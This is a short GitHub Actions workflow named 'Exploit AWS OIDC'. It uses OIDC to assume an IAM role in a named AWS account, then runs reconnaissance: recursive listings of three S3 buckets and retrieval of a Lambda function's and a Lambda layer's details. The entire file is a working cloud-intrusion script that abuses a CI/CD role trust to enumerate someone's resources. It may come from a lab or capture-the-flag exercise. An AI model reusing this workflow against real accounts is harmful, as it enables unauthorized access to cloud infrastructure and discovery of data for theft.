name: Exploit AWS OIDC

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Recon - Deep Dive
        run: |
          echo "=== S3 Bucket Contents ==="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive
          aws s3 ls s3://codec4f26c862a321ef5 --recursive
          aws s3 ls s3://site781fe43f26b9eba3 --recursive

          echo "=== Lambda Function Details ==="
          aws lambda get-function --function-name nslookupv2

          echo "=== Lambda Layer Details ==="
          aws lambda get-layer-version --layer-name arn:aws:lambda:us-east-1:009661764077:layer:nslookup_layer --version-number 8
